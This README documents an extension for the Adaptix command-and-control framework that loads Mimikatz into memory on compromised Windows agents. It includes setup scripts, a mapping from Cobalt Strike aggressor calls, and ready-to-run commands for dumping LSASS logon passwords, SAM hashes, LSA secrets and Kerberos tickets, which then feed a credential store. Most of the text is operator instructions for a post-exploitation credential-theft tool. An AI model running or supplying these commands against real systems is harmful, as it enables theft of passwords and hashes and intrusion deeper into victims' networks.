# Mimikatz

In-memory execution of the official [Mimikatz](https://github.com/gentilkiwi/mimikatz) PE via the [No-Consolation](https://github.com/fortra/No-Consolation) BOF. This is the Cobalt Strike *community* way to get the full module set (`sekurlsa`, `lsadump`, `kerberos`, `vault`, `dpapi`, `token`, `privilege`, `crypto`, ...).

The PE is **not** stored in git. Fetch it on the teamserver, then reload axscripts.

```bash
bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh
```

The default release is pinned to `2.2.0-20220919`. Set `MIMIKATZ_VERSION` to use another release tag or `MIMIKATZ_URL` to use an internal mirror:

```bash
MIMIKATZ_VERSION=2.2.0-20220919 bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh
MIMIKATZ_URL=https://mirror.example/mimikatz_trunk.zip bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh
```

Requires `Execution-BOF` to be built (`NoConsolation.x64.o`).

## Why this is not a `mimikatz.x64.o` rewrite

Cobalt Strike's built-in `mimikatz` / Aggressor `bmimikatz` / `bmimikatz_small` are **not** a compile of gentilkiwi's tree into a BOF.

- Fortra ships Mimikatz as a **post-ex reflective DLL** (same class as Hashdump, Screenshot, ExecuteAssembly). `bmimikatz($bid, "coffee")` just drives that DLL.
- Official BOF docs say a BOF must not link libc or other libraries and is not for large projects. Full Mimikatz (CRT, many modules, optional driver) cannot be a single hand-written BOF.
- The CS-community pattern for *complete* Mimikatz is: a small BOF PE loader (`Inline-Execute-PE` / `No-Consolation`) + `beacon_inline_execute` + `bof_pack`. Adaptix `execute bof` is that call.

Native BOFs already cover the *small* CS-style jobs: `hashdump`, `lsadump_sam`, `lsadump_secrets`, `lsadump_cache`, `nanodump`. Those are real `.o` files. They are not the full Mimikatz command set.

## CS aggressor → Adaptix

Cobalt Strike `.cna`:

```
$barch  = barch($1);
$handle = openf(script_resource("NoConsolation. $+ $barch $+ .o"));
$data   = readb($handle, -1);
$args   = bof_pack($1, "...", $pe_bytes, $cmdline);
beacon_inline_execute($1, $data, "go", $args);
```

Adaptix axscript (what `mimikatz` does):

```
let bof_params = ax.bof_pack("wstr,cstr,...", [..., pebytes, ..., pecmdline, ...]);
ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Mimikatz");
```

| Cobalt Strike | Adaptix |
|---|---|
| `beacon_inline_execute` / `binline_execute` | `execute bof` |
| `bof_pack` | `ax.bof_pack` |
| `bmimikatz` | `mimikatz` |
| `bmimikatz_small` | `mimikatz_small` |
| `logonpasswords` alias | `logonpasswords` |
| post-ex `Mimikatz.dll` | official `mimikatz.exe` mapped by `NoConsolation.*.o` |

## Usage

Windows `beacon` / `gopher` / `kharon`. Most credential modules need high integrity.

```
mimikatz
mimikatz privilege::debug sekurlsa::logonpasswords
mimikatz privilege::debug token::elevate lsadump::sam
mimikatz privilege::debug sekurlsa::tickets /export
mimikatz coffee
mimikatz_small
logonpasswords
```

Flags on `mimikatz`:

```
mimikatz [--timeout 120] [-f /path/to/mimikatz.exe] [--no-exit] [--dont-save] [-k] [modules...]
```

Empty module list defaults to `privilege::debug sekurlsa::logonpasswords` and appends `exit` so the inline PE returns.

`--timeout` accepts `0..900` seconds; `0` disables the wait. The current No-Consolation loader requires a 64-bit agent.

Plaintext and NTLM from the output are added to the Adaptix credentials store. Access-menu shortcuts cover logonpasswords, tickets, ekeys, SAM, LSA secrets, cache, vault, and coffee.

## Troubleshooting

| Message | Fix |
|---|---|
| `mimikatz.x64.exe not found` | Run `bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh` on the teamserver, then reload the Creds-BOF AxScript. |
| `No-Consolation loader ... is missing` | Run `make -C Extension-Kit/Execution-BOF` and reload the Creds-BOF AxScript. |
| `Mimikatz PE could not be read` | Make sure the `Creds-BOF` directory is included in the AxScript sandbox roots and that the PE is readable by the teamserver process. |
| `requires a 64-bit agent` | Use a 64-bit agent; the current No-Consolation integration does not support 32-bit/WoW64 agents. |

The validator can check the repository layout without executing a BOF:

```bash
node scripts/verify_extension_kit.mjs
```

## License

Mimikatz is [CC BY 4.0](https://github.com/gentilkiwi/mimikatz) (Benjamin Delpy). This wrapper launches the official build; it does not reimplement the modules.
